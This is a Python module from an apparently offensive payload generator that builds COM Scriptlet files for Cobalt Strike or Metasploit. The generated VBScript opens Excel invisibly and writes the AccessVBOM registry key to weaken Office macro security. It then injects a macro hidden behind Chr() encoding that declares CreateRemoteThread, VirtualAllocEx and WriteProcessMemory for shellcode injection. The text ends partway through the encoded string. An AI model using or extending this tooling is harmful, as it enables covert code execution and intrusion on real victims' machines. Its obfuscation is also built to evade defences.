#!/usr/bin/env python
from uuid import uuid4
from string import ascii_uppercase, digits
from random import choice
from shutil import copyfile, which
from fileops import fileFindReplace
import re
from os import system
from sys import exit
from encoder import encodeStringAsChr, convertToVBAFormat

'''
This module is used for generating COM Scriptlet payloads.
'''

def genClassID():
	'''
	Generates a Class ID aka uuid for the COM scriptlet payload.

	Returns uuid
	'''
	return uuid4()

def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
	'''
	Generates a COM Scriptlet payload aka sct file.
	'''
	copyfile('./templates/payload_template.sct', 'payload.sct')
	fileFindReplace('payload.sct', 'exampleprogid', genProgID())
	fileFindReplace('payload.sct', 'exampleclassid', str(genClassID()))
	if 'CobaltStrike' in framework:
		modifyCobaltStrikePayload(cspayload , x86, x64)
	elif 'Metasploit' in framework:
		if 'VBAMacro' in stagingMethod:
			msfShellCode = getMetasploitShellCode(redirector)
			macro = genVBAMacro(convertToVBAFormat(encodeStringAsChr(msfShellCode)), redirector, x86, x64)
			fileFindReplace('payload.sct', '\'Insert', macro)
	else:
		print('{0} framework is not supported yet' % framework)

def genProgID(size=8, chars=ascii_uppercase + digits):
	'''
	Generates a pseudo random program id for the COM scriptlet payload.

	Returns a program id
	'''
	progid = ''.join(choice(chars) for _ in range(size))
	return progid

def genVBAMacro(shellCode, redirector, x86, x64):
	'''
	Generates a visual basic macro. This is a lazy version until we 
	write a Chr encoding function that accounts for string concatenation
	and line length within vba. Ideally, this will be switched over to a
	VBA Macro COM Scriptlet template and we build the entire Chr encoded
	string.
	'''
	start = '''
	<script language="vbscript">
	<![CDATA[
		Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False

Set WshShell = CreateObject("Wscript.Shell")

function RegExists(regKey)
	on error resume next
	WshShell.RegRead regKey
	RegExists = (Err.number = 0)
end function

' Get the old AccessVBOM value
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"

if RegExists(RegPath) then
	action = WshShell.RegRead(RegPath)
else
	action = ""
end if

' Weaken the target
WshShell.RegWrite RegPath, 1, "REG_DWORD"

' Run the macro
Set objWorkbook = objExcel.Workbooks.Add()
Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
xlmodule.CodeModule.AddFromString Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(80)&Chr(82)&Chr(79)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(95)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(82)&Chr(77)&Chr(65)&Chr(84)&Chr(73)&Chr(79)&Chr(78)&Chr(10)& _
Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)& _
Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(100)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(100)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(84)&Chr(121)&Chr(112)&Chr(101)& _
Chr(10)&Chr(10)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(83)&Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(85)&Chr(80)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(99)& _
Chr(98)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(108)&Chr(112)&Chr(82)&Chr(101)&Chr(115)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(100)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)& _
Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(108)&Chr(112)&Chr(68)&Chr(101)&Chr(115)&Chr(107)&Chr(116)&Chr(111)&Chr(112)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(108)& _
Chr(112)&Chr(84)&Chr(105)&Chr(116)&Chr(108)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(88)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(89)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(88)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)& _
Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(89)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(88)& _
Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(89)&Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(67)& _
Chr(104)&Chr(97)&Chr(114)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(70)&Chr(105)&Chr(108)&Chr(108)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)& _
Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(100)&Chr(119)&Chr(70)&Chr(108)&Chr(97)&Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)& _
Chr(32)&Chr(119)&Chr(83)&Chr(104)&Chr(111)&Chr(119)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(73)&Chr(110)&Chr(116)&Chr(101)&Chr(103)&Chr(101)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(99)&Chr(98)&Chr(82)&Chr(101)& _
Chr(115)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(100)&Chr(50)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(73)&Chr(110)&Chr(116)&Chr(101)&Chr(103)&Chr(101)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(108)&Chr(112)&Chr(82)&Chr(101)&Chr(115)&Chr(101)&Chr(114)&Chr(118)&Chr(101)& _
Chr(100)&Chr(50)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(83)&Chr(116)&Chr(100)&Chr(73)&Chr(110)&Chr(112)&Chr(117)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(83)&Chr(116)&Chr(100)&Chr(79)&Chr(117)&Chr(116)&Chr(112)&Chr(117)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(104)&Chr(83)&Chr(116)&Chr(100)& _
Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(10)&Chr(10)&Chr(35)&Chr(73)&Chr(102)&Chr(32)&Chr(86)&Chr(66)&Chr(65)&Chr(55)& _
Chr(32)&Chr(84)&Chr(104)&Chr(101)&Chr(110)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(80)&Chr(116)&Chr(114)&Chr(83)&Chr(97)&Chr(102)& _
Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)& _
Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(82)&Chr(101)&Chr(109)&Chr(111)&Chr(116)&Chr(101)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(34)& _
Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)& _
Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(83)&Chr(116)&Chr(97)&Chr(99)&Chr(107)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(83)& _
Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(97)&Chr(114)&Chr(97)&Chr(109)&Chr(101)& _
Chr(116)&Chr(101)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(108)&Chr(97)& _
Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(68)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)& _
Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(80)& _
Chr(116)&Chr(114)&Chr(83)&Chr(97)&Chr(102)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)& _
Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(86)&Chr(105)&Chr(114)&Chr(116)&Chr(117)&Chr(97)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(69)&Chr(120)&Chr(34)& _
Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)& _
Chr(108)&Chr(112)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)& _
Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)& _
Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(108)&Chr(80)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(99)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)&Chr(65)&Chr(115)& _
Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(80)&Chr(116)&Chr(114)& _
Chr(83)&Chr(97)&Chr(102)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)& _
Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(77)&Chr(101)&Chr(109)&Chr(111)&Chr(114)& _
Chr(121)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(108)&Chr(68)&Chr(101)&Chr(115)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(82)&Chr(101)&Chr(102)&Chr(32)&Chr(83)&Chr(111)&Chr(117)&Chr(114)&Chr(99)&Chr(101)& _
Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)& _
Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(87)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)& _
Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(80)&Chr(116)&Chr(114)&Chr(83)& _
Chr(97)&Chr(102)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)& _
Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(65)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)& _
Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(65)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)& _
Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(76)&Chr(105)&Chr(110)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)& _
Chr(112)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)& _
Chr(101)&Chr(97)&Chr(100)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(98)&Chr(73)&Chr(110)&Chr(104)& _
Chr(101)&Chr(114)&Chr(105)&Chr(116)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(67)&Chr(114)&Chr(101)& _
Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(108)&Chr(97)&Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)& _
Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(68)&Chr(105)&Chr(114)&Chr(101)&Chr(99)&Chr(116)&Chr(111)& _
Chr(114)&Chr(121)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(117)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)& _
Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(85)&Chr(80)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)& _
Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(80)&Chr(82)&Chr(79)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(95)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(82)&Chr(77)&Chr(65)&Chr(84)&Chr(73)&Chr(79)&Chr(78)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(10)&Chr(35)&Chr(69)&Chr(108)&Chr(115)&Chr(101)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)& _
Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)& _
Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(82)&Chr(101)&Chr(109)&Chr(111)&Chr(116)&Chr(101)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)& _
Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)& _
Chr(100)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(83)&Chr(116)&Chr(97)& _
Chr(99)&Chr(107)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(65)&Chr(100)&Chr(100)& _
Chr(114)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(97)&Chr(114)&Chr(97)&Chr(109)&Chr(101)&Chr(116)&Chr(101)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)& _
